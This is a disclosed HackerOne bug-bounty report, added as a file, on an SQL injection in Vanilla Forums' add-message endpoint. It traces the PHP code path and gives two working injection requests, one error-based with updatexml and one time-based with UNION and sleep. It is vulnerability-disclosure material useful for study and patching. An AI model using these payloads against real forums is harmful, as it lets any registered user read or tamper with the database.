@@ -1,0 +1,199 @@
+ReportLink:https://hackerone.com/reports/358570
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/balis0ng
+ReportedTo:Vanilla(vanilla)
+BountyAmount:600.0
+Severity:critical
+State:Closed
+DateOfDisclosure:25.10.2018 2:02:50
+
+Summary:
+
+**Summary:**
+There is a SQL injection vulnerability in the vanilla, an attacker can use this vulnerability to obtain database information.
+**Description:**
+in applications/conversations/controllers/class.messagescontroller.php:164
+```php
+public function addMessage($conversationID = '') {
+        $this->Form->setModel($this->ConversationMessageModel);
+        if (is_numeric($conversationID) && $conversationID > 0) {
+            $this->Form->addHidden('ConversationID', $conversationID);
+        }
+
+        if ($this->Form->authenticatedPostBack()) {
+            $conversationID = $this->Form->getFormValue('ConversationID', '');
+
+            // Make sure the user posting to the conversation is actually
+            // a member of it, or is allowed, like an admin.
+            if (!checkPermission('Garden.Moderation.Manage')) {
+                $userID = Gdn::session()->UserID;
+                $validConversationMember = $this->ConversationModel->validConversationMember($conversationID, $userID);
+                if (!$validConversationMember) {
+                    throw permissionException();
+                }
+            }
+```
+We noticed that the value of $conversationID is controlled by us.It can be an array.
+Then we saw that $conversationID was brought into the validConversationMember function.Let's follow in this function.
+```php
+    public function validConversationMember($conversationID, $userID) {
+        $conversationMembers = $this->getConversationMembers($conversationID, true, false, false, true);
+        return (in_array($userID, $conversationMembers));
+    }
+```
+OK,It is brought into the getConversationMembers function.go on.
+```php
+public function getConversationMembers($conversationID, $idsOnly = true, $limit = false, $offset = false, $active = null) {
+        $conversationMembers = [];
+
+        $userConversation = new Gdn_Model('UserConversation');
+        if (is_array($conversationID)) {
+            $where = $conversationID;
+        } else {
+            $where = ['ConversationID' => $conversationID];
+        }
+        if ($active === true) {
+            $where['Deleted'] = 0;
+        } elseif ($active === false) {
+            $where['Deleted'] = 1;
+        }
+        $userMembers = $userConversation->getWhere($where, 'UserID', 'asc', $limit, $offset)->resultArray();
+
+        if (is_array($userMembers) && count($userMembers)) {
+            if ($idsOnly) {
+                $conversationMembers = array_column($userMembers, 'UserID');
+            } else {
+                $conversationMembers = Gdn_DataSet::index($userMembers, 'UserID');
+            }
+        }
+
+        return $conversationMembers;
+    }
+```
+You can see that when the value of $conversationID is an array, assign $conversationID directly to $where.
+Then $where is brought into the getWhere function.
+```php
+   public function getWhere($where = false, $orderFields = '', $orderDirection = 'asc', $limit = false, $offset = false) {
+        $this->_beforeGet();
+        return $this->SQL->getWhere($this->Name, $where, $orderFields, $orderDirection, $limit, $offset);
+    }
+```
+```php
+  public function getWhere($table = '', $where = false, $orderFields = '', $orderDirection = 'asc', $limit = false, $offset = 0) {
+        if ($table != '') {
+            //$this->mapAliases($Table);
+            $this->from($table);
+        }
+
+        if ($where !== false) {
+            $this->where($where);
+        }
+
+        if ($orderFields != '') {
+            $this->orderBy($orderFields, $orderDirection);
+        }
+
+        if ($limit !== false) {
+            $this->limit($limit, $offset);
+        }
+
+        $result = $this->query($this->getSelect());
+
+        return $result;
+    }
+```
+Keep track of $where.
+```php
+public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
+        if (!is_array($field)) {
+            $field = [$field => $value];
+        }
+        foreach ($field as $subField => $subValue) {
+            if (is_array($subValue)) {
+                if (count($subValue) == 1) {
+                    $firstVal = reset($subValue);
+                    $this->where($subField, $firstVal);
+                } else {
+                    $this->whereIn($subField, $subValue);
+                }
+            } else {
+                $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
+                if (strlen($whereExpr) > 0) {
+                    $this->_where($whereExpr);
+                }
+            }
+        }
+        return $this;
+    }
+```
+Yeah, you can see we can control the value of the field to cause the injection.
+As I said in the vulnerability https://hackerone.com/reports/353784.
+## Steps to reproduce:
+
+1.The first step is to enable conversations.
+2.We register and log in to an account
+3.Construct an injection message. The value of TransientKey can be grabbed from a normal POST packet.
+The attack packet that I constructed based on error injection is as follows:
+```
+POST /messages/addmessage/ HTTP/1.1
+Host: localhost
+Content-Length: 222
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://localhost
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://localhost/messages/2
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzAxNTIzMzMsImlhdCI6MTUyNzU2MDMzMywic3ViIjo3fQ.WFdBfYiPUWy_M8N861m3gT1S3LvqpTBfWvqM9WWRUKY; Vanilla-Vv=1527560333; Vanilla-tk=qKz7tUjBiiRQRALz%3A7%3A1527560334%3Aa656c9644245d85d788c83d32d4cc3bd
+Connection: close
+
+TransientKey=qKz7tUjBiiRQRALz&hpt=&ConversationID[1%3d1+or+updatexml(1,concat(0x3e,user()),0)+and+1]=2&Format=Markdown&Body=123123&DeliveryType=VIEW&DeliveryMethod=JSON&Send Message=Send Message&BodyLastMessageID=Message_2
+```
+As shown in the figure, the database user name is output:
+F302792
+Delayed injection attack message using Union operation is as follows:
+```
+POST /messages/addmessage/ HTTP/1.1
+Host: localhost
+Content-Length: 275
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://localhost
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://localhost/messages/2
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzAxNTIzMzMsImlhdCI6MTUyNzU2MDMzMywic3ViIjo3fQ.WFdBfYiPUWy_M8N861m3gT1S3LvqpTBfWvqM9WWRUKY; Vanilla-Vv=1527560333; Vanilla-tk=qKz7tUjBiiRQRALz%3A7%3A1527560334%3Aa656c9644245d85d788c83d32d4cc3bd
+Connection: close
+
+TransientKey=qKz7tUjBiiRQRALz&hpt=&ConversationID[1%3d1+and+1%3d1+union+select+1,2,3,4,5,6,7,sleep(5),9+union+select+*+from+GDN_UserConversation+where+1]=2&Format=Markdown&Body=123123&DeliveryType=VIEW&DeliveryMethod=JSON&Send Message=Send Message&BodyLastMessageID=Message_2
+```
+As shown, delay 5S:
+F302796
+The complete SQL statement executed in the database is
+**select *
+from GDN_UserConversation `UserConversation`
+where 1=1 and 1=1 union select 1,2,3,4,5,6,7,sleep(5),9 union select * from GDN_UserConversation where 1 = '2'
+ and Deleted = '0'
+order by UserID asc**
+## Anything else we should know?
+
+## Impact
+
+Only need an ordinary registered member to complete the SQL injection attack, the attacker can manipulate database information through the vulnerability
+
+The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
+
+**Verified**
+Yes
+
+**What exploitation technique did you utilize?**
+UNION Operation
+
+**Please describe the results of your verification attempt.**
+observed a 5+ second time delay
